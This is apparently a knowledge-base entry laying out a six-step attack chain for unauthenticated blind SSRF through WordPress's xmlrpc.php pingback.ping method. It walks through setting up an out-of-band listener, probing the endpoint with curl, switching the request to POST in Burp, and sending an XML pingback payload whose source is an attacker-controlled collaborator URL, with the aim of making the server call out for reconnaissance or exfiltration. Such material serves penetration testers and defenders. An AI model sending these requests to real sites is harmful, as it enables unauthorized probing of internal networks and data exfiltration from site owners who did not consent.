---
id: ac-unauth-blind-ssrf-wordpress-xmlrpc
tags:
  - ssrf
  - blind-ssrf
  - wordpress
  - xmlrpc
  - pingback
  - unauthenticated
type: attack_chain
tools:
  - '[[tools/interactsh]]'
  - '[[tools/Burp-Suite]]'
  - '[[tools/Burp-Suite-Collaborator]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-SSRF-Listener]]'
  - '[[procedures/Confirm-xmlrpc-Endpoint]]'
  - '[[procedures/Intercept-and-Modify-Request-with-Burp]]'
  - '[[procedures/Craft-Pingback-Ping-Payload]]'
  - '[[procedures/Send-SSRF-Exploit-Request]]'
  - '[[procedures/Observe-SSRF-Callback]]'
step_count: 6
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:08:46.025Z'
description: >-
  Multi-stage exploitation of an unauthenticated blind SSRF vulnerability in the
  WordPress xmlrpc.php endpoint using pingback.ping to force server requests to
  attacker-controlled URLs, enabling internal network scanning and data
  exfiltration.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Unauthenticated Blind SSRF via WordPress xmlrpc.php Pingback

Multi-stage attack chain demonstrating exploitation of an unauthenticated blind Server-Side Request Forgery (SSRF) in the xmlrpc.php endpoint of a WordPress site, allowing attackers to force the server to connect to external attacker-controlled resources for reconnaissance or exfiltration without authentication.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Up Listener] --> B[Confirm Endpoint]
    B --> C[Intercept Request]
    C --> D[Craft Payload]
    D --> E[Send Exploit]
    E --> F[Observe Callback]
    F --> G[Internal Access/Exfil]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/interactsh]]
- [[tools/Burp-Suite]]
- [[tools/Burp-Suite-Collaborator]]

### Target Environment

- WordPress-based web application
- Exposed xmlrpc.php endpoint
- PHP runtime

### Initial Access Requirements

- Public internet access to target URL (e.g., https://target/xmlrpc.php)
- No credentials required (unauthenticated)
- Attacker-controlled external server for callbacks

## Detailed Attack Procedures

### Step 1: Set Up External Listener
procedure: [[procedures/Set-Up-SSRF-Listener]]

**Objective**: Establish a listener to detect incoming SSRF callbacks from the target server.

**Instructions**: Deploy an out-of-band interaction server using [[tools/interactsh]] or generate a unique domain via [[tools/Burp-Suite-Collaborator]]. Start the listener to monitor for requests.

**Expected Output**: Active listener ready to log incoming connections, such as DNS queries or HTTP requests to the unique domain.

**Success Indicators**:
- Listener server is running and accessible
- Unique payload URL generated (e.g., oast-1234567890xyz.burpcollaborator.net)

### Step 2: Confirm xmlrpc.php Endpoint
procedure: [[procedures/Confirm-xmlrpc-Endpoint]]

**Objective**: Verify the xmlrpc.php endpoint exists and accepts POST requests without authentication.

**Instructions**: Send a GET request to https://target/xmlrpc.php using a browser or [[commands/curl-basic-get]] to observe the response.

```bash
curl -X GET https://target/xmlrpc.php
```

**Expected Output**: HTTP response body stating "XML-RPC server accepts POST requests only."

**Success Indicators**:
- Endpoint responds with POST-only message
- No authentication prompt

### Step 3: Intercept and Modify Request with Burp Suite
procedure: [[procedures/Intercept-and-Modify-Request-with-Burp]]

**Objective**: Capture and switch the request method to POST for payload injection.

**Instructions**: Configure Burp Suite proxy to intercept traffic, send the initial GET to Repeater, and change to POST method.

**Expected Output**: Modified POST request template ready in Burp Repeater.

**Success Indicators**:
- Request intercepted successfully
- Method changed to POST without errors

### Step 4: Craft Pingback.ping Payload
procedure: [[procedures/Craft-Pingback-Ping-Payload]]

**Objective**: Build an XML payload using the pingback.ping method to include the attacker-controlled URL.

**Instructions**: In Burp Repeater, set the Content-Type to application/xml and body to the crafted XML with source (attacker URL) and target (victim URL).

**Expected Output**: Valid XML payload like:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>https://oast-1234567890xyz.burpcollaborator.net/payload</string></value></param>
    <param><value><string>https://target/</string></value></param>
  </params>
</methodCall>
```

**Success Indicators**:
- XML validates without syntax errors
- Attacker URL embedded as first parameter

### Step 5: Send SSRF Exploit Request
procedure: [[procedures/Send-SSRF-Exploit-Request]]

**Objective**: Transmit the payload to trigger the SSRF, forcing the server to request the external URL.

**Instructions**: Forward the POST request from Burp Repeater to the target https://target/xmlrpc.php.

**Expected Output**: HTTP 200 OK response from xmlrpc.php, indicating payload acceptance.

**Success Indicators**:
- Request sent successfully
- No error in XML parsing

### Step 6: Observe SSRF Callback
procedure: [[procedures/Observe-SSRF-Callback]]

**Objective**: Confirm exploitation by detecting the callback to the listener.

**Instructions**: Monitor logs in [[tools/interactsh]] or Burp Collaborator for incoming requests from the target IP.

**Expected Output**: Log entry showing HTTP GET/POST or DNS resolution to the payload URL, including target server details.

**Success Indicators**:
- Callback received confirming SSRF
- Request headers reveal internal info (e.g., User-Agent with server details)

## Attack Chain Summary

### Key Achievements

1. Confirmed unauthenticated access to xmlrpc.php
2. Forced server to connect to external listener via pingback.ping
3. Demonstrated potential for internal network scanning or data exfiltration

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Active Scanning]] Active Scanning

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Reconnaissance]] Reconnaissance

---
*Last updated: 2023-10-01T00:00:00Z*
